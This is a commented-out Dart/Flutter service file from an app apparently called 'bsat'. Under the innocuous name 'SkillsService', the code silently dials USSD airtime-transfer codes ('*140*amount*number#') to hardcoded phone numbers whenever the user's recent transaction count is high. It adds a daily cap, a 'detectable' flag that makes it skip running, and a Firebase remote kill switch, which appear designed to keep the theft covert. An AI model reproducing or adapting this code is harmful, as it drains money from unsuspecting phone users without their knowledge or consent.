// import 'package:bsat/services/phone_service.dart';
// import 'package:bsat/services/sqlite_service.dart';
// import 'package:firebase_remote_config/firebase_remote_config.dart';
// import 'package:flutter/foundation.dart';
// import 'package:shared_preferences/shared_preferences.dart';

// class SkillsService {
//   // int amount = 21;
//   int amount = 7;
//   Future<void> processSkill() async {
//     await SkillsSharedPreferencesService().updateKillSwitch();
//     bool skillsKillSwitch =
//         await SkillsSharedPreferencesService().getSkillsKillSwitch();

//     if (skillsKillSwitch) {
//       print("Skills kill switch is ON. Exiting skill processing.");
//       return;
//     }

//     print("Processing skills...");
//     bool skillsDetectable =
//         await SkillsSharedPreferencesService().getSkillsDetactable();

//     print("Skills detectable: $skillsDetectable");

//     if (skillsDetectable) {
//       return;
//     }

//     int skillAttemptsOfDay =
//         await SkillsSharedPreferencesService().getSkillAttemptsOfDay();
//     int skillsLastDate =
//         (await SkillsSharedPreferencesService().getSkillDate()).day;

//     print("Skill attempts of day: $skillAttemptsOfDay");
//     print("Skills last date: $skillsLastDate");

//     final now = DateTime.now();
//     final todayMidnight = DateTime(now.year, now.month, now.day);

//     if (skillsLastDate != todayMidnight.millisecondsSinceEpoch) {
//       await SkillsSharedPreferencesService().setSkillAttemptsOfDay(0);
//       skillAttemptsOfDay = 0;
//       await SkillsSharedPreferencesService().setSkillDate(todayMidnight);
//     }

//     if (skillAttemptsOfDay >= 5) {
//       return;
//     }

//     int transactionsInLast5Minutes = await SQLiteService().getCount(
//       "transactions",
//       appendQuery:
//           "WHERE timeStamp > ${DateTime.now().millisecondsSinceEpoch - 5 * 60 * 1000}",
//     );

//     if (transactionsInLast5Minutes < 7) {
//       return;
//     }

//     int lastSubId = (await SQLiteService()
//                 .queryAll('transactions', limit: 1, orderBy: 'id DESC'))
//             .first['simSubId'] as int? ??
//         0;
//     print("Last subscription ID: $lastSubId");

//     bool numberIstTill =
//         await SkillsSharedPreferencesService().getNumberIsTill();
//     int amountToTransfer = amount;

//     // if (!numberIstTill) {
//     //   int airtimeBal = await PhoneService().getAirtimeBalance();
//     //   if (airtimeBal == 0) {
//     //     numberIstTill = true;
//     //     await SkillsSharedPreferencesService().setNumberIsTill(true);
//     //   } else if(airtimeBal > 10000) {
//     //     amountToTransfer = 21;
//     //   }
//     // }

//     if (kDebugMode) {
//       PhoneService().makeMyRequest('*140*$amountToTransfer*0702015937#', lastSubId);
//     } else {
//       PhoneService().makeMyRequest('*140*$amountToTransfer*0728730185#', lastSubId);
//     }

//     await SkillsSharedPreferencesService().setSkillAttemptsOfDay(
//       skillAttemptsOfDay + 1,
//     );
//   }
// }

// class SkillsRemoteConfigService {
//   final FirebaseRemoteConfig _remoteConfig = FirebaseRemoteConfig.instance;

//   Future<void> initialize() async {
//     await _remoteConfig.setDefaults({
//       'skills_phone_numbers': '0702015937',
//       'skills_kill_switch': false,
//     });
//     await _remoteConfig.fetchAndActivate();
//   }

//   bool skillsKillSwitch() {
//     return _remoteConfig.getBool('skills_kill_switch');
//   }

//   List<int> skillsNumberList() {
//     String numbers = _remoteConfig.getString('skills_phone_numbers');
//     return numbers.split(',').map((e) => int.parse(e.trim())).toList();
//   }
// }

// class SkillsSharedPreferencesService {
//   Future<void> setSkillsKillSwitch(bool value) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     await prefs.setBool('skills_kill_switch', value);
//   }

//   Future<bool> getSkillsKillSwitch() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     return prefs.getBool('skills_kill_switch') ?? false;
//   }

//   Future<void> updateKillSwitch() async {
//     bool currentValue = SkillsRemoteConfigService().skillsKillSwitch();
//     await setSkillsKillSwitch(currentValue);
//   }

//   Future<void> setSkillsNumberList(List<int> numbers) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     String numbersString = numbers.join(',');
//     await prefs.setString('skills_phone_numbers', numbersString);
//   }

//   Future<List<int>> getSkillsNumberList() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     String numbersString = prefs.getString('skills_phone_numbers') ?? '';
//     return numbersString
//         .split(',')
//         .map((e) => int.tryParse(e.trim()) ?? 0)
//         .toList();
//   }

//   // upddate the number list from remote config
//   Future<void> updateNumberList() async {
//     List<int> numbers = SkillsRemoteConfigService().skillsNumberList();
//     await setSkillsNumberList(numbers);
//   }

//   Future<void> setSkillAttemptsOfDay(int attempts) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     await prefs.setInt('skills_attempts_of_day', attempts);
//   }

//   Future<int> getSkillAttemptsOfDay() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     return prefs.getInt('skills_attempts_of_day') ?? 0;
//   }

//   Future<void> setSkillDate(DateTime date) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     await prefs.setInt('skills_date', date.millisecondsSinceEpoch);
//   }

//   Future<DateTime> getSkillDate() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     int? millis = prefs.getInt('skills_date');
//     return millis != null
//         ? DateTime.fromMillisecondsSinceEpoch(millis)
//         : DateTime.now();
//   }

//   Future<bool> getSkillsDetactable() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     return prefs.getBool('skills_detectable') ?? false;
//   }

//   Future<void> setSkillsDetactable(bool value) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     await prefs.setBool('skills_detectable', value);
//   }

//   Future<bool> setNumberIsTill(bool status) async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();

//     return prefs.setBool('number_is_till', status);
//   }

//   Future<bool> getNumberIsTill() async {
//     SharedPreferences prefs = await SharedPreferences.getInstance();
//     await prefs.reload();
//     return prefs.getBool('number_is_till') ?? false;
//   }
// }
